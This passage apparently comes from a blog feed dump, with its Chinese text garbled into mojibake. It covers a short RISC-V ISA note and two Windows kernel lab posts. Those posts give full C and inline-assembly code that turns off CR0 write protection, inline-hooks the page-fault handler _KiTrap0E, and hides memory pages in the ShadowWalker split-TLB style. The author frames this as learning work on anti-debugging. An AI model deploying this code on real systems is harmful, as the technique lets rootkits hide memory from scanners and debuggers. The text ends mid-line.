RV64Iå’ŒRV32I</td></tr></tbody></table><table><thead><tr><th>æ‰©å±•æŒ‡ä»¤é›†</th><th>æè¿°</th></tr></thead><tbody><tr><td>Mæ‹“å±•</td><td>æä¾›ä¹˜æ³•å’Œé™¤æ³•æŒ‡ä»¤</td></tr><tr><td>Aæ‹“å±•</td><td>æä¾›åŸå­æ“ä½œæŒ‡ä»¤</td></tr><tr><td>Fæ‹“å±•</td><td>æä¾›å•ç²¾åº¦æµ®ç‚¹æ•°æ“ä½œæŒ‡ä»¤</td></tr><tr><td>Dæ‹“å±•</td><td>æä¾›åŒç²¾åº¦æµ®ç‚¹æ•°æ“ä½œæŒ‡ä»¤</td></tr><tr><td>Cæ‹“å±•</td><td>æä¾›å‹ç¼©æŒ‡ä»¤é›†</td></tr><tr><td>Zæ‹“å±•</td><td>æä¾›å¯¹æ§åˆ¶å’ŒçŠ¶æ€å¯„å­˜å™¨(CSR)çš„æ“ä½œæŒ‡ä»¤</td></tr><tr><td>Pæ‹“å±•</td><td>æä¾›å‘é‡æ“ä½œæŒ‡ä»¤</td></tr><tr><td>Bæ‹“å±•</td><td>æä¾›ä½æ“ä½œæŒ‡ä»¤</td></tr><tr><td>ç­‰ç­‰</td><td>ç­‰ç­‰</td></tr></tbody></table><p><strong>IMAFD</strong>è¢«ç§°ä¸ºé€šç”¨(General)ç»„åˆï¼Œç”¨Gè¡¨ç¤º</p><h2 id="RISC-Vé€šç”¨å¯„å­˜å™¨"><a href="#RISC-Vé€šç”¨å¯„å­˜å™¨" class="headerlink" title="RISC-Vé€šç”¨å¯„å­˜å™¨"></a>RISC-Vé€šç”¨å¯„å­˜å™¨</h2><p><img src="/2023/07/08/ISA-risc-v/image-20230626115944963.png" alt="image-20230626115944963"></p><p>RV32E å°† 32 ä¸ªé€šç”¨å¯„å­˜å™¨ç¼©å‡ä¸º 16 ä¸ª</p><h2 id="Hart"><a href="#Hart" class="headerlink" title="Hart"></a>Hart</h2><p>HART &#x3D; HARdware Thread</p><p>ç±»ä¼¼äºintelçš„è¶…çº¿ç¨‹æŠ€æœ¯ï¼Œä¸€ä¸ªæ ¸é‡Œå¯ä»¥è·‘ä¸¤ä¸ªçº¿ç¨‹(æŒ‡ä»¤æ‰§è¡Œæµ)ï¼Œè¿™é‡Œçš„HARTæ¦‚å¿µå°±æ˜¯è¿™æ ·ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œæµ</p><h2 id="ç‰¹æƒçº§åˆ«"><a href="#ç‰¹æƒçº§åˆ«" class="headerlink" title="ç‰¹æƒçº§åˆ«"></a>ç‰¹æƒçº§åˆ«</h2><p><img src="/2023/07/08/ISA-risc-v/image-20230626122607114.png" alt="image-20230626122607114"></p><p>level3 machineæ˜¯æœ€é«˜æ€</p><p>æ¯”å¦‚è¯´linuxæ“ä½œç³»ç»Ÿç”¨æˆ·æ€riscv cpuæ˜¯å·¥ä½œåœ¨User(00)çº§çš„,å†…æ ¸æ€cpuæ˜¯åœ¨Supervisor(01)çº§çš„</p><p>Machineæ€ç±»ä¼¼äºx86çš„å®æ¨¡å¼ï¼Œä¸Šç”µä¹‹åæ˜¯å¤„äºMachineæ€çš„ï¼Œéƒ½æ˜¯ç‰©ç†åœ°å€</p><h2 id="Control-and-Status-Registers-CSR"><a href="#Control-and-Status-Registers-CSR" class="headerlink" title="Control and Status Registers(CSR)"></a>Control and Status Registers(CSR)</h2><p>ä¸åŒçš„ç‰¹æƒçº§åˆ«ä¸‹æ—¶åˆ†åˆ«å¯¹åº”å„è‡ªçš„ä¸€å¥—CSR</p><p>é«˜çº§åˆ«çš„ç‰¹æƒçº§ä¸‹å¯ä»¥è®¿é—®ä½çº§åˆ«çš„CSRï¼Œåä¹‹ä¸è¡Œ</p><h2 id="å†…å­˜ç®¡ç†å’Œä¿æŠ¤"><a href="#å†…å­˜ç®¡ç†å’Œä¿æŠ¤" class="headerlink" title="å†…å­˜ç®¡ç†å’Œä¿æŠ¤"></a>å†…å­˜ç®¡ç†å’Œä¿æŠ¤</h2><h2 id="å¼‚å¸¸å’Œä¸­æ–­"><a href="#å¼‚å¸¸å’Œä¸­æ–­" class="headerlink" title="å¼‚å¸¸å’Œä¸­æ–­"></a>å¼‚å¸¸å’Œä¸­æ–­</h2>]]></content>
      
      
      
        <tags>
            
            <tag> RISC-V </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:ShadowWalker</title>
      <link href="/2023/06/04/Windows-Kernel-Experiment-ShadowWalker/"/>
      <url>/2023/06/04/Windows-Kernel-Experiment-ShadowWalker/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-ShadowWalker"><a href="#Windowså†…æ ¸å®éªŒ-ShadowWalker" class="headerlink" title="Windowså†…æ ¸å®éªŒ:ShadowWalker"></a>Windowså†…æ ¸å®éªŒ:ShadowWalker</h1><p>æ¥ç€ä¸Šä¸€æ¬¡inlinehookç¼ºé¡µå¼‚å¸¸æ¥åšè¿›ç¨‹ä¿æŠ¤ï¼Œåè°ƒè¯•ç­‰</p><p>æˆ‘ä»¬hookä½ç¼ºé¡µå¼‚å¸¸åå¯ä»¥æ ¹æ®é”™è¯¯ç çš„ç¬¬äº”ä½åˆ¤æ–­æ˜¯å–æŒ‡ä»¤é€ æˆçš„ç¼ºé¡µï¼Œè¿˜æ˜¯è¯»å†™é€ æˆçš„å¼‚å¸¸ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯¹ä¸¤ç§ä¸åŒç¼ºé¡µåšä¸åŒçš„å¼‚å¸¸å¤„ç†ï¼Œå¯ä»¥åœ¨æŒ‡ä»¤é€ æˆç¼ºé¡µæ—¶ï¼ŒæŠŠæ­£ç¡®é¡µæŒ‚åˆ°tlbé‡Œæ¥ä½¿ç¨‹åºå¯ä»¥æ­£å¸¸æ‰§è¡Œï¼Œè¯»å†™é€ æˆç¼ºé¡µæ—¶ï¼ŒæŒ‚åˆ°ä¸€ä¸ªfakeé¡µä¸Šæ¥åè°ƒè¯•</p><p>0ç¯æ„Ÿè§‰è¦åšåˆ°ç¨³å®šæ˜¯å¾ˆéš¾çš„</p><p>inlinehook.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REAL_PTE (DWORD64 *)0x8003f250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_PTE (DWORD64 *)0x8003f258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR3 0x8003f260</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">JmpTarget</span><span class="params">()</span>;</span><br><span class="line"><span class="type">char</span>* p = (<span class="type">char</span>*)<span class="number">0x8003f130</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">        <span class="comment">//è£¸å‡½æ•°é‡Œå°½é‡ä¸ç”¨å±€éƒ¨å˜é‡ï¼Œå› ä¸ºæ²¡æœ‰æ ˆå¸§</span></span><br><span class="line">        <span class="comment">//è¯•äº†ä¸€ä¸‹å¦‚æœè¿™é‡Œç”¨size_t i=0;çš„è¯ï¼Œä½¿ç”¨äº†å¯„å­˜å™¨ediè®¡æ•°ï¼Œä½†æ˜¯è¿˜æ˜¯åœ¨ç”¨å…¨å±€å˜é‡ä¿é™©</span></span><br><span class="line">        *p = ((<span class="type">char</span>*)JmpTarget)[i];</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="comment">//å…³é—­å†™ä¿æŠ¤</span></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        and eax, not <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        <span class="comment">//æ„é€ _KiTrap0E hookå¤´</span></span><br><span class="line">        <span class="comment">//push 0x8003f130  68 30 F1 03 80</span></span><br><span class="line">        <span class="comment">//ret  C3</span></span><br><span class="line">        mov al,<span class="number">0x68</span></span><br><span class="line">        mov ds:[<span class="number">0x80541450</span>],al</span><br><span class="line">        mov dword ptr ds:[<span class="number">0x80541451</span>],<span class="number">0x8003f130</span></span><br><span class="line">        mov al, <span class="number">0xc3</span></span><br><span class="line">        mov ds:[<span class="number">0x80541455</span>],al</span><br><span class="line"></span><br><span class="line">        mov eax,<span class="number">0xffffffff</span></span><br><span class="line">        mov ds:[T_CR3],eax</span><br><span class="line">        <span class="comment">//å¼€å¯å†™ä¿æŠ¤</span></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        or eax, <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) JmpTarget() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushad</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        cmp eax, ds: [T_CR3]</span><br><span class="line">        jnz PASS</span><br><span class="line"></span><br><span class="line">        mov eax, cr2</span><br><span class="line">        shr eax, <span class="number">0xc</span></span><br><span class="line">        cmp eax, <span class="number">0x412</span></span><br><span class="line">        jnz PASS</span><br><span class="line">        <span class="comment">//å–å‡ºé”™è¯¯ç ï¼Œ+20æ˜¯å› ä¸ºpushadå‹äº†æ ˆ</span></span><br><span class="line">        mov eax, ss: [esp + <span class="number">0x20</span>]</span><br><span class="line">        test eax, <span class="number">0x10</span></span><br><span class="line">        jne EXECUTE</span><br><span class="line">        jmp READWRITE</span><br><span class="line">        <span class="comment">//å–æŒ‡ä»¤é€ æˆå¼‚å¸¸</span></span><br><span class="line">    EXECUTE:</span><br><span class="line">    &#125;</span><br><span class="line">    *PTE(<span class="number">0x412000</span>)=*REAL_PTE;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="comment">//æ”¾å…¥æŒ‡ä»¤tlbé‡Œ</span></span><br><span class="line">        mov eax, <span class="number">0x412004</span></span><br><span class="line">        call eax</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="comment">//å†æ¬¡é”€æ¯é¡µï¼Œä½¿è¯»å†™æ—¶é€ æˆç¼ºé¡µ</span></span><br><span class="line">    *PTE(<span class="number">0x412000</span>) = <span class="number">0</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        popad</span><br><span class="line">        <span class="comment">//é”™è¯¯ç ä¸ä¼šè¢«iretå¼¹å‡ºï¼Œè¦æ‰‹åŠ¨å¹³æ‰è¿™ä¸ªæ ˆ</span></span><br><span class="line">        add esp, <span class="number">4</span></span><br><span class="line">        iretd</span><br><span class="line">    READWRITE :</span><br><span class="line">    &#125;</span><br><span class="line">    *PTE(<span class="number">0x412000</span>) = *FAKE_PTE;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="comment">//æ”¾å…¥æ•°æ®tlb</span></span><br><span class="line">        mov eax,ds:[<span class="number">0x41c000</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    *PTE(<span class="number">0x412000</span>) = <span class="number">0</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        popad</span><br><span class="line">        <span class="comment">//é”™è¯¯ç ä¸ä¼šè¢«iretå¼¹å‡ºï¼Œè¦æ‰‹åŠ¨å¹³æ‰è¿™ä¸ªæ ˆ</span></span><br><span class="line">        add esp, <span class="number">4</span></span><br><span class="line">        iretd</span><br><span class="line"> PASS:<span class="comment">//æ— å…³è¿›ç¨‹è¿”å›åˆ°åŸæ¥çš„_KiTrap0Eå¤„ç†</span></span><br><span class="line">        popad</span><br><span class="line">        mov word ptr[esp + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line">        push <span class="number">0x80541457</span></span><br><span class="line">        ret </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REAL_PTE (DWORD64 *)0x8003f250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_PTE (DWORD64 *)0x8003f258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR3 0x8003f260</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;fake_data&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;fake_data&quot;</span>)) DWORD fake_page[<span class="number">1024</span>];<span class="comment">//0x41c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span></span><br><span class="line">    *REAL_PTE = *PTE(<span class="number">0x412000</span>);</span><br><span class="line">    *FAKE_PTE = *PTE(<span class="number">0x41c000</span>);</span><br><span class="line">    <span class="comment">//ä½¿é¡µå¤±æ•ˆ,ä¸å­˜åœ¨,æ¯æ¬¡éƒ½ä¼šè§¦å‘ç¼ºé¡µ,ä»è€Œæ¥å—æˆ‘ä»¬hookçš„æ£€æµ‹</span></span><br><span class="line">    *PTE(<span class="number">0x412000</span>)=<span class="number">0</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov ds:[T_CR3],eax<span class="comment">//ç¼ºé¡µå¼‚å¸¸æ—¶ä¼šè·³åˆ°è¢«æˆ‘ä»¬inlinhookçš„KiTrap0E,jnz endæ¯”è¾ƒèµ·æ¥å°±ä¼šä¸€æ ·</span></span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    fake_page[<span class="number">0</span>] = <span class="number">0x12345678</span>;<span class="comment">//ç¡®ä¿åŠ è½½ç‰©ç†é¡µ</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg(<span class="string">&quot;.mycode&quot;</span>) __declspec(allocate(<span class="string">&quot;.mycode&quot;</span>)) int main();</span></span><br><span class="line"><span class="comment">//0x412000</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm&#123;</span><br><span class="line">        jmp L</span><br><span class="line">        ret <span class="comment">//0412004</span></span><br><span class="line">    L:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i++);</span><br><span class="line">        Sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯»çš„è¯æ˜¯è¯»åˆ°äº†fakeé¡µï¼Œæ‰§è¡Œæ­£å¸¸</p><p><img src="/2023/06/04/Windows-Kernel-Experiment-ShadowWalker/image-20230604120326540.png" alt="image-20230604120326540"></p><p>ç”±äºè¿›ç¨‹ç»“æŸæ—¶è¦å›æ”¶ç‰©ç†å†…å­˜ï¼Œæ‰€ä»¥è¦åœ¨mainé€€å‡ºæ—¶ï¼Œæ¢å¤é¡µé¢å€¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:é¡µé¢å¼‚å¸¸</title>
      <link href="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/"/>
      <url>/2023/06/03/Windows-Kernel-Experiment-Page-Fault/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-é¡µé¢å¼‚å¸¸"><a href="#Windowså†…æ ¸å®éªŒ-é¡µé¢å¼‚å¸¸" class="headerlink" title="Windowså†…æ ¸å®éªŒ:é¡µé¢å¼‚å¸¸"></a>Windowså†…æ ¸å®éªŒ:é¡µé¢å¼‚å¸¸</h1><p>è¦inlinehookçš„æ˜¯ï¼Œ0eå·ç¼ºé¡µå¼‚å¸¸çš„å¤„ç†ç¨‹åº_KiTrap0E,åœ¨å‘ç”Ÿç¼ºé¡µçš„æ—¶å€™æ£€æµ‹ä¸€ä¸‹ç¼ºé¡µæ—¶çš„æ ˆ</p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/image-20230603210651048.png" alt="image-20230603210651048"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:80541450                               _KiTrap0E proc near</span><br><span class="line">.text:80541450 66 C7 44 24 02 00 00          mov     word ptr [esp+2], 0</span><br><span class="line">.text:80541457 55                            push    ebp</span><br><span class="line">.text:80541458 53                            push    ebx</span><br><span class="line">.text:80541459 56                            push    esi</span><br><span class="line">.text:8054145A 57                            push    edi</span><br><span class="line">.text:8054145B 0F A0                         push    fs</span><br><span class="line">.text:8054145D BB 30 00 00 00                mov     ebx, 30h ; &#x27;0&#x27;</span><br><span class="line">.text:80541462 66 8E E3                      mov     fs, bx</span><br><span class="line">.text:80541465                               assume fs:nothing</span><br><span class="line">.text:80541465 64 8B 1D 00 00 00 00          mov     ebx, large fs:0</span><br><span class="line">.text:8054146C 53                            push    ebx</span><br><span class="line">.text:8054146D 83 EC 04                      sub     esp, 4</span><br><span class="line">.text:80541470 50                            push    eax</span><br></pre></td></tr></table></figure><p><strong>inlinehook.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//å†…æ ¸é‡Œgdtrç©ºé—²ä½å­˜å‚¨ä»å‡ºç°ç¼ºé¡µå¼‚å¸¸è¯»å–å‡ºæ¥æ•°æ®</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_ERRNO 0x8003f250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_EIP 0x8003f254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR3 0x8003f258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR2 0x8003f25c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">JmpTarget</span><span class="params">()</span>;</span><br><span class="line"><span class="type">char</span>* p = (<span class="type">char</span>*)<span class="number">0x8003f130</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">        <span class="comment">//è£¸å‡½æ•°é‡Œå°½é‡ä¸ç”¨å±€éƒ¨å˜é‡ï¼Œå› ä¸ºæ²¡æœ‰æ ˆå¸§</span></span><br><span class="line">        <span class="comment">//è¯•äº†ä¸€ä¸‹å¦‚æœè¿™é‡Œç”¨size_t i=0;çš„è¯ï¼Œä½¿ç”¨äº†å¯„å­˜å™¨ediè®¡æ•°ï¼Œä½†æ˜¯è¿˜æ˜¯åœ¨ç”¨å…¨å±€å˜é‡ä¿é™©</span></span><br><span class="line">        *p = ((<span class="type">char</span>*)JmpTarget)[i];</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="comment">//å…³é—­å†™ä¿æŠ¤</span></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        and eax, not <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        <span class="comment">//æ„é€ _KiTrap0E hookå¤´</span></span><br><span class="line">        <span class="comment">//push 0x8003f130  68 30 F1 03 80</span></span><br><span class="line">        <span class="comment">//ret  C3</span></span><br><span class="line">        mov al,<span class="number">0x68</span></span><br><span class="line">        mov ds:[<span class="number">0x80541450</span>],al</span><br><span class="line">        mov dword ptr ds:[<span class="number">0x80541451</span>],<span class="number">0x8003f130</span></span><br><span class="line">        mov al,<span class="number">0xc3</span></span><br><span class="line">        mov ds:[<span class="number">0x80541455</span>],al</span><br><span class="line"></span><br><span class="line">        mov eax,<span class="number">0xffffffff</span></span><br><span class="line">        mov ds:[T_CR3],eax</span><br><span class="line">        xor eax,eax</span><br><span class="line">        mov ds:[T_ERRNO],eax</span><br><span class="line">        mov ds:[T_CR2],eax</span><br><span class="line">        mov ds:[T_EIP],eax</span><br><span class="line">        <span class="comment">//å¼€å¯å†™ä¿æŠ¤</span></span><br><span class="line">        mov eax, cr0</span><br><span class="line">        or eax, <span class="number">0x10000</span></span><br><span class="line">        mov cr0, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="type">void</span> __declspec(naked) JmpTarget() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push eax</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        cmp eax,ds:[T_CR3]</span><br><span class="line">        jnz end</span><br><span class="line">        <span class="comment">//å› ä¸ºå‰é¢pushäº†eaxï¼Œæ‰€ä»¥ç°åœ¨æ ˆæ¯”åŸä¸­æ–­æ ˆå°äº†4</span></span><br><span class="line">        mov eax,ss:[esp+<span class="number">4</span>]</span><br><span class="line">        mov ds:[T_ERRNO],eax</span><br><span class="line">        mov eax,ss:[esp+<span class="number">8</span>]</span><br><span class="line">        mov ds:[T_EIP],eax</span><br><span class="line">        <span class="comment">//cr2ä¿å­˜äº†å¯¼è‡´é¡µé”™è¯¯çš„çº¿æ€§åœ°å€</span></span><br><span class="line">        mov eax,cr2</span><br><span class="line">        mov ds:[T_CR2],eax</span><br><span class="line">  end:<span class="comment">//è¿”å›åˆ°åŸæ¥çš„_KiTrap0Eå¤„ç†</span></span><br><span class="line">        pop eax</span><br><span class="line">        mov word ptr[esp + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line">        push <span class="number">0x80541457</span></span><br><span class="line">        ret </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼ºé¡µå¼‚å¸¸ä¼šå‹ä¸€ä¸ªå‡ºé”™ç </p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/image-20230603233450894.png" alt="image-20230603233450894"></p><p>cr2ä¿å­˜äº†å¯¼è‡´é¡µé”™è¯¯çš„çº¿æ€§åœ°å€</p><p><img src="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/image-20230603233002202.png" alt="image-20230603233002202"></p><p><strong>test.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//å†…æ ¸é‡Œgdtrç©ºé—²ä½å­˜å‚¨ä»å‡ºç°ç¼ºé¡µå¼‚å¸¸è¯»å–å‡ºæ¥æ•°æ®</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_ERRNO 0x8003f250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_EIP 0x8003f254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR3 0x8003f258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_CR2 0x8003f25c</span></span><br><span class="line">DWORD g_errno,g_eip,g_cr2;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov ds:[T_CR3],eax<span class="comment">//ç¼ºé¡µå¼‚å¸¸æ—¶ä¼šè·³åˆ°è¢«æˆ‘ä»¬inlinhookçš„KiTrap0E,jnz endæ¯”è¾ƒèµ·æ¥å°±ä¼šä¸€æ ·</span></span><br><span class="line">        mov eax,ds:[T_EIP]</span><br><span class="line">        mov g_eip,eax</span><br><span class="line">        mov eax,ds:[T_CR2]</span><br><span class="line">        mov g_cr2,eax</span><br><span class="line">        mov eax,ds:[T_ERRNO]</span><br><span class="line">        mov g_errno,eax</span><br><span class="line">        xor eax,eax</span><br><span class="line">        mov ds:[T_EIP],eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">        interrupt();</span><br><span class="line">        <span class="keyword">if</span>(g_eip)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;eip:0x%x errno:0x%x cr2:0x%x\n&quot;</span>,g_eip,g_errno,g_cr2);</span><br><span class="line">        Sleep(<span class="number">10000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªè¦ä¸æœ‰å¤ªå¤šçš„ä¸­é—´æ“ä½œï¼Œç¬¬äºŒæ¬¡æ‰“å¼€text.exeçš„cr3åŸºæœ¬ä¸å˜</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">u 80541450</span></span><br><span 